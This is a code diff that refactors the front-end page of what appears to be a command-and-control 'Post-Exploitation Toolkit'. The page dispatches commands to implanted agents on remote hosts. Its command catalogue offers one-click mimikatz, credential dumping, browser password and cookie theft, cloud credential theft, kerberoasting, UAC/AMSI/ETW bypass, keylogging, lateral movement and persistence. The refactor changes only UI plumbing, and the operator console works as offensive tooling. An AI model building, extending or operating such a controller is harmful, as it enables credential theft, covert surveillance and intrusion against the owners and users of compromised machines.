@@ -1,17 +1,21 @@
 "use client";
 
 import { useEffect, useState, useCallback } from "react";
-import { StatusBadge } from "@/components/UI";
-import { API_BASE } from "@/lib/constants";
-import { apiGet } from "@/lib/api";
+import { StatusBadge, PageHeader } from "@/components/UI";
+import { Card } from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
+import { Badge } from "@/components/ui/badge";
+import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
+import { api } from "@/lib/api";
+import { useI18n } from "@/lib/i18n";
+import { toast } from "sonner";
+import { Skeleton } from "@/components/ui/skeleton";
 
 interface ToolkitAgent {
-  ID?: string;
-  Hostname?: string;
-  IP?: string;
-  OS?: string;
   id?: string;
   hostname?: string;
+  ip?: string;
+  os?: string;
 }
 
 interface RecentTask {
@@ -30,63 +34,50 @@ interface RecentTask {
 }
 
 export default function ToolkitPage() {
+  const { t } = useI18n();
   const [toolkitAgents, setToolkitAgents] = useState<ToolkitAgent[]>([]);
   const [recentTasks, setRecentTasks] = useState<RecentTask[]>([]);
   const [loading, setLoading] = useState(true);
   const [selectedAgent, setSelectedAgent] = useState("");
   const [agentInfo, setAgentInfo] = useState<Record<string, unknown> | null>(null);
-  const [toast, setToast] = useState<string | null>(null);
-
   const runAction = async (action: string, param = "") => {
     if (!selectedAgent) {
-      setToast("Select an agent first");
+      toast.error("Select an agent first");
       return;
     }
     try {
-      const body = new URLSearchParams({ action, param });
-      const res = await fetch(`${API_BASE}?p=/toolkit/agents/${selectedAgent}/action&format=json`, {
-        method: "POST",
-        credentials: "include",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: body.toString(),
-      });
-      const data = await res.json();
+      const data = await api.post(`/toolkit/agents/${selectedAgent}/action`, { action, param });
       if (data.success) {
-        setToast(`Dispatched ${action} (task #${data.task_id})`);
+        toast.success(`Dispatched ${action} (task #${data.task_id})`);
         loadData();
       } else {
-        setToast(data.error || "Action failed");
+        toast.error((data.error as string) || "Failed to execute action");
       }
     } catch (e) {
-      setToast(String(e));
+      toast.error(String(e));
     }
-    setTimeout(() => setToast(null), 3000);
   };
 
   useEffect(() => {
     if (!selectedAgent) { setAgentInfo(null); return; }
-    apiGet<{ agent?: Record<string, unknown> }>(`/toolkit/agents/${selectedAgent}/info`)
+    api.get<{ agent?: Record<string, unknown> }>(`/toolkit/agents/${selectedAgent}/info`)
       .then((d) => setAgentInfo(d.agent || null))
       .catch(() => setAgentInfo(null));
   }, [selectedAgent]);
 
   const loadData = useCallback(async () => {
     try {
-      const [agentsRes, tasksRes] = await Promise.all([
-        fetch(`${API_BASE}?p=/agents&format=json`),
-        fetch(`${API_BASE}?p=/toolkit/results&format=json`, { credentials: "include" }),
+      const [agentsData, tasksData] = await Promise.all([
+        api.get("/agents"),
+        api.get("/toolkit/results"),
       ]);
-      if (!agentsRes.ok) throw new Error(`HTTP ${agentsRes.status}`);
-      if (!tasksRes.ok) throw new Error(`HTTP ${tasksRes.status}`);
-      const agentsData = await agentsRes.json();
-      const tasksData = await tasksRes.json();
-      setToolkitAgents(agentsData.Agents || agentsData.agents || []);
-      setRecentTasks(tasksData.Tasks || tasksData.tasks || tasksData.results || tasksData.data || []);
-    } catch (e) { console.error("Toolkit: load data failed", e); }
+      setToolkitAgents((agentsData.agents || []) as ToolkitAgent[]);
+      setRecentTasks((tasksData.tasks || tasksData.results || tasksData.data || []) as RecentTask[]);
+    } catch { toast.error("Toolkit: load data failed"); }
     setLoading(false);
   }, []);
 
-  useEffect(() => { Promise.resolve().then(() => loadData()); }, [loadData]);
+  useEffect(() => { loadData(); }, [loadData]);
 
   const quickActions = [
     { label: "whoami", value: "whoami" },
@@ -102,57 +93,57 @@ export default function ToolkitPage() {
   ];
 
   const categories = [
-    { name: "System Recon", color: "cyan", commands: [
-      { cmd: "whoami", desc: "Current user identity" },
-      { cmd: "hostname", desc: "Hostname" },
-      { cmd: "ipconfig", desc: "Network config" },
-      { cmd: "systeminfo", desc: "System details" },
-      { cmd: "env", desc: "Environment variables" },
-      { cmd: "uptime", desc: "System uptime" },
+    { name: t("toolkit.cat_system_recon"), color: "cyan", commands: [
+      { cmd: "whoami", desc: t("toolkit.desc_whoami") },
+      { cmd: "hostname", desc: t("toolkit.desc_hostname") },
+      { cmd: "ipconfig", desc: t("toolkit.desc_ipconfig") },
+      { cmd: "systeminfo", desc: t("toolkit.desc_systeminfo") },
+      { cmd: "env", desc: t("toolkit.desc_env") },
+      { cmd: "uptime", desc: t("toolkit.desc_uptime") },
     ]},
-    { name: "Process & Service", color: "emerald", commands: [
-      { cmd: "ps", desc: "Process list" },
-      { cmd: "tasklist", desc: "Detailed task list" },
-      { cmd: "services", desc: "Service list" },
-      { cmd: "schtasks", desc: "Scheduled tasks" },
-      { cmd: "drivers", desc: "Driver list" },
+    { name: t("toolkit.cat_process_service"), color: "emerald", commands: [
+      { cmd: "ps", desc: t("toolkit.desc_ps") },
+      { cmd: "tasklist", desc: t("toolkit.desc_tasklist") },
+      { cmd: "services", desc: t("toolkit.desc_services") },
+      { cmd: "schtasks", desc: t("toolkit.desc_schtasks") },
+      { cmd: "drivers", desc: t("toolkit.desc_drivers") },
     ]},
-    { name: "Network Recon", color: "blue", commands: [
-      { cmd: "netstat", desc: "Connection state" },
-      { cmd: "netstat -an", desc: "All connections" },
-      { cmd: "arp -a", desc: "ARP cache" },
-      { cmd: "route print", desc: "Routing table" },
-      { cmd: "net user", desc: "Local users" },
-      { cmd: "net localgroup", desc: "Local admin group" },
-      { cmd: "av", desc: "AV detection" },
+    { name: t("toolkit.cat_network_recon"), color: "blue", commands: [
+      { cmd: "netstat", desc: t("toolkit.desc_netstat") },
+      { cmd: "netstat -an", desc: t("toolkit.desc_netstat_all") },
+      { cmd: "arp -a", desc: t("toolkit.desc_arp") },
+      { cmd: "route print", desc: t("toolkit.desc_route") },
+      { cmd: "net user", desc: t("toolkit.desc_net_user") },
+      { cmd: "net localgroup", desc: t("toolkit.desc_net_localgroup") },
+      { cmd: "av", desc: t("toolkit.desc_av") },
     ]},
-    { name: "Credential Access", color: "rose", commands: [
-      { cmd: "mimikatz", desc: "Credential extraction" },
-      { cmd: "creds_dump", desc: "System credential export" },
-      { cmd: "browser_steal", desc: "Browser password steal" },
-      { cmd: "cookie_export", desc: "Cookie export" },
-      { cmd: "vpn_creds", desc: "VPN/SSH credential extraction" },
-      { cmd: "wifi_creds", desc: "WiFi password extraction" },
-      { cmd: "kerberoast", desc: "Kerberoast attack" },
-      { cmd: "cloud_steal", desc: "Cloud credential theft (AWS/Azure/GCP)" },
+    { name: t("toolkit.cat_credential_access"), color: "rose", commands: [
+      { cmd: "mimikatz", desc: t("toolkit.desc_mimikatz") },
+      { cmd: "creds_dump", desc: t("toolkit.desc_creds_dump") },
+      { cmd: "browser_steal", desc: t("toolkit.desc_browser_steal") },
+      { cmd: "cookie_export", desc: t("toolkit.desc_cookie_export") },
+      { cmd: "vpn_creds", desc: t("toolkit.desc_vpn_creds") },
+      { cmd: "wifi_creds", desc: t("toolkit.desc_wifi_creds") },
+      { cmd: "kerberoast", desc: t("toolkit.desc_kerberoast") },
+      { cmd: "cloud_steal", desc: t("toolkit.desc_cloud_steal") },
     ]},
-    { name: "PrivEsc & Bypass", color: "amber", commands: [
-      { cmd: "privesc_check", desc: "Privilege escalation detection" },
-      { cmd: "elevate", desc: "Elevate (BypassUAC)" },
-      { cmd: "uac_bypass", desc: "UAC bypass" },
-      { cmd: "amsi_bypass", desc: "AMSI bypass" },
-      { cmd: "etw_bypass", desc: "ETW bypass" },
+    { name: t("toolkit.cat_privesc_bypass"), color: "amber", commands: [
+      { cmd: "privesc_check", desc: t("toolkit.desc_privesc_check") },
+      { cmd: "elevate", desc: t("toolkit.desc_elevate") },
+      { cmd: "uac_bypass", desc: t("toolkit.desc_uac_bypass") },
+      { cmd: "amsi_bypass", desc: t("toolkit.desc_amsi_bypass") },
+      { cmd: "etw_bypass", desc: t("toolkit.desc_etw_bypass") },
     ]},
-    { name: "Screen & Monitor", color: "purple", commands: [
-      { cmd: "screenshot", desc: "Single screenshot" },
-      { cmd: "keylogger_start", desc: "Start keylogger" },
-      { cmd: "keylogger_stop", desc: "Stop keylogger" },
-      { cmd: "keylogger_dump", desc: "Dump keylogger" },
-      { cmd: "clipboard_get", desc: "Get clipboard" },
+    { name: t("toolkit.cat_screen_monitor"), color: "purple", commands: [
+      { cmd: "screenshot", desc: t("toolkit.desc_screenshot") },
+      { cmd: "keylogger_start", desc: t("toolkit.desc_keylogger_start") },
+      { cmd: "keylogger_stop", desc: t("toolkit.desc_keylogger_stop") },
+      { cmd: "keylogger_dump", desc: t("toolkit.desc_keylogger_dump") },
+      { cmd: "clipboard_get", desc: t("toolkit.desc_clipboard_get") },
     ]},
-    { name: "Lateral & Persist", color: "teal", commands: [
-      { cmd: "lateral", desc: "Lateral movement" },
-      { cmd: "persistence", desc: "Install persistence" },
+    { name: t("toolkit.cat_lateral_persist"), color: "teal", commands: [
+      { cmd: "lateral", desc: t("toolkit.desc_lateral") },
+      { cmd: "persistence", desc: t("toolkit.desc_persistence") },
     ]},
   ];
 
@@ -167,107 +158,105 @@ export default function ToolkitPage() {
   };
 
   return (
-    <div className="max-w-7xl mx-auto mb-20 md:mb-0">
-      {toast && (
-        <div className="mb-3 px-4 py-2 bg-indigo-50 dark:bg-indigo-900/20 border border-indigo-200 rounded-2xl text-sm text-indigo-700">{toast}</div>
-      )}
-      <div className="flex flex-col lg:flex-row lg:items-center justify-between mb-4 sm:mb-6 gap-3">
-        <div>
-          <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-slate-900 dark:text-slate-100">Post-Exploitation Toolkit</h1>
-          <p className="text-slate-500 dark:text-slate-400 text-xs sm:text-sm mt-1">One-click execution of common post-exploitation operations</p>
-        </div>
+    <div className="max-w-[80rem] mx-auto pb-12 md:pb-0 animate-fade-slide-up">
+      <PageHeader title={t("toolkit.title")} subtitle={t("toolkit.subtitle")}>
         <div className="flex items-center gap-2">
-          <span className="text-sm text-slate-500 dark:text-slate-400">Target Agent:</span>
-          <select value={selectedAgent} onChange={(e) => setSelectedAgent(e.target.value)} className="px-3 py-2 ui-card rounded-lg text-sm focus:outline-none focus:border-blue-500 min-w-[200px]">
-            <option value="">-- Select Agent --</option>
-            {toolkitAgents.map((a, i) => (
-              <option key={i} value={a.ID || ""}>
-                {(a.Hostname || "unknown")} ({a.IP || "-"})
-              </option>
-            ))}
-          </select>
+          <span className="text-sm text-muted-foreground">{t("toolkit.target_agent")}</span>
+          <Select value={selectedAgent} onValueChange={v => setSelectedAgent(v ?? "")}>
+            <SelectTrigger className="w-full"><SelectValue placeholder={t("toolkit.select_agent_placeholder")} /></SelectTrigger>
+            <SelectContent>
+              <SelectItem value="">{t("toolkit.select_agent_placeholder")}</SelectItem>
+              {toolkitAgents.map((a, i) => (
+                <SelectItem key={i} value={a.id || ""}>
+                  {(a.hostname || "unknown")} ({a.ip || "-"})
+                </SelectItem>
+              ))}
+            </SelectContent>
+          </Select>
         </div>
-      </div>
+      </PageHeader>
 
-      <div className="grid grid-cols-1 xl:grid-cols-4 gap-6">
+      <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
         <div className="xl:col-span-3 space-y-4">
-          <div className="ui-card p-4">
+          <Card className="p-4">
             <div className="flex items-center gap-2 mb-3">
               <span className="text-amber-400 text-sm font-bold">!</span>
-              <span className="text-xs font-semibold text-[var(--text-secondary)] dark:text-gray-300">Quick Actions</span>
+              <span className="text-xs font-semibold text-muted-foreground">{t("toolkit.quick_actions")}</span>
             </div>
             <div className="flex flex-wrap gap-2">
               {quickActions.map((qa) => (
-                <button key={qa.value} onClick={() => runAction(qa.value)} className="px-3 py-2 bg-[var(--card-bg)] hover:bg-blue-50 dark:hover:bg-blue-900/20 border border-[var(--border)] hover:border-blue-500/30 rounded-2xl text-xs text-gray-600 dark:text-slate-500 dark:text-slate-400 hover:text-blue-600 dark:hover:text-blue-400 transition-all">
+                <Button key={qa.value} variant="outline" size="sm" onClick={() => runAction(qa.value)} className="rounded-xl text-xs hover:border-primary/30 hover:text-primary transition-all">
                   {qa.label}
-                </button>
+                </Button>
               ))}
             </div>
-          </div>
+          </Card>
 
           {loading ? (
             <div className="space-y-4">
-              {[1,2,3].map(i => <div key={i} className="h-32 bg-slate-200 dark:bg-slate-800 rounded-2xl animate-pulse" />)}
+              {[1,2,3].map(i => <Skeleton key={i} className="h-32 rounded-xl" />)}
             </div>
           ) : (
             categories.map((cat) => (
-              <div key={cat.name} className="ui-card overflow-hidden">
-                <div className="flex items-center justify-between px-5 py-3.5 cursor-pointer hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+              <Card key={cat.name} className="overflow-hidden">
+                <div className="flex items-center justify-between px-5 py-3.5 cursor-pointer hover:bg-muted transition-colors">
                   <div className="flex items-center gap-3">
-                    <div className={`w-8 h-8 rounded-2xl flex items-center justify-center border ${colorMap[cat.color]}`}>
+                    <div className={`w-8 h-8 rounded-xl flex items-center justify-center border ${colorMap[cat.color]}`}>
                       <span className="text-xs font-bold">{cat.name[0]}</span>
                     </div>
-                    <span className="font-semibold text-sm text-slate-900 dark:text-slate-100 dark:text-gray-200">{cat.name}</span>
-                    <span className="text-[10px] px-2 py-0.5 bg-slate-100 dark:bg-slate-700 text-gray-500 dark:text-slate-500 dark:text-slate-400 rounded-full">{cat.commands.length}</span>
+                    <span className="font-semibold text-sm text-foreground">{cat.name}</span>
+                    <Badge variant="secondary" className="text-[10px] px-2 py-0.5">{cat.commands.length}</Badge>
                   </div>
                 </div>
                 <div className="px-5 pb-4 space-y-1">
                   {cat.commands.map((c) => (
-                    <button key={c.cmd} onClick={() => runAction(c.cmd)} className="w-full flex items-center gap-3 px-3 py-2 rounded-2xl hover:bg-slate-50 dark:hover:bg-slate-700/50 border border-transparent hover:border-slate-200 dark:hover:border-slate-700 transition-all text-left">
+                    <Button key={c.cmd} variant="ghost" onClick={() => runAction(c.cmd)} className="w-full flex items-center gap-3 px-3 py-2 rounded-xl justify-start text-left border border-transparent hover:border-border transition-all">
                       <span className={`text-xs font-mono font-medium w-28 shrink-0 ${colorMap[cat.color]?.split(" ")[1] || "text-blue-600 dark:text-blue-400"}`}>{c.cmd}</span>
-                      <span className="text-xs text-gray-500">{c.desc}</span>
-                      <span className="ml-auto text-[10px] text-slate-500 dark:text-slate-400">Run</span>
-                    </button>
+                      <span className="text-xs text-muted-foreground">{c.desc}</span>
+                      <span className="ml-auto text-[10px] text-muted-foreground">{t("toolkit.run")}</span>
+                    </Button>
                   ))}
                 </div>
-              </div>
+              </Card>
             ))
           )}
         </div>
 
         <div className="space-y-4">
           {agentInfo && (
-            <div className="ui-card p-4 text-xs space-y-1">
-              <div className="font-semibold text-[var(--text-secondary)] dark:text-gray-300 mb-2">Agent Info</div>
-              <div>Host: {String(agentInfo.hostname || agentInfo.Hostname || "-")}</div>
-              <div>IP: {String(agentInfo.ip || agentInfo.IP || "-")}</div>
-              <div>Integrity: {String(agentInfo.integrity || agentInfo.Integrity || "-")}</div>
-              <div>Interval: {String(agentInfo.current_interval ?? agentInfo.CurrentInterval ?? "-")}s</div>
-            </div>
+            <Card className="p-4 text-xs space-y-1">
+              <div className="font-semibold text-muted-foreground mb-2">{t("toolkit.agent_info")}</div>
+              <div>Host: {String(agentInfo.hostname || "-")}</div>
+              <div>IP: {String(agentInfo.ip || "-")}</div>
+              <div>Integrity: {String(agentInfo.integrity || "-")}</div>
+              <div>Interval: {String(agentInfo.current_interval ?? "-")}s</div>
+            </Card>
           )}
-          <div className="ui-card overflow-hidden">
-            <div className="flex items-center justify-between px-4 py-3.5 border-b border-[var(--border)]">
-              <span className="text-sm font-semibold text-[var(--text-secondary)] dark:text-gray-300">Recent Results</span>
-              <span className="text-[10px] text-gray-500 bg-slate-100 dark:bg-slate-700 px-1.5 py-0.5 rounded-full">{recentTasks.length}</span>
+          <Card className="overflow-hidden">
+            <div className="flex items-center justify-between px-4 py-3.5 border-b border-border">
+              <span className="text-sm font-semibold text-muted-foreground">{t("toolkit.recent_results")}</span>
+              <Badge variant="secondary" className="text-[10px] px-1.5 py-0.5">{recentTasks.length}</Badge>
             </div>
             <div className="max-h-[600px] overflow-y-auto">
               {recentTasks.length === 0 ? (
-                <div className="p-8 text-center text-slate-500 dark:text-slate-400 text-xs">No task results yet</div>
+                <div className="p-4 sm:p-5 text-center text-muted-foreground text-xs">{t("toolkit.no_results")}</div>
               ) : (
                 recentTasks.map((t, i) => (
-                  <div key={i} className="px-4 py-3 border-b border-slate-100 dark:border-slate-700 last:border-0 hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
+                  <div key={i} className="px-4 py-3 border-b border-border last:border-0 hover:bg-muted transition-colors">
                     <div className="flex items-center justify-between mb-1">
-                      <span className="text-[10px] font-mono text-slate-500 dark:text-slate-400">{(t.AgentID || t.agent_id || "").toString().slice(0, 8)}</span>
-                      <StatusBadge status={t.Status || t.status || ""} />
+                      <span className="text-[10px] font-mono text-muted-foreground">{(t.agent_id || "").toString().slice(0, 8)}</span>
+                      <StatusBadge status={t.status || ""} />
                     </div>
-                    <div className="text-xs font-medium text-[var(--text-secondary)] dark:text-gray-300 truncate">{t.Type || t.type}: {t.Command || t.command}</div>
+                    <div className="text-xs font-medium text-muted-foreground truncate">{t.type}: {t.command}</div>
                   </div>
                 ))
               )}
             </div>
-          </div>
+          </Card>
         </div>
       </div>
     </div>
   );
 }
+
+
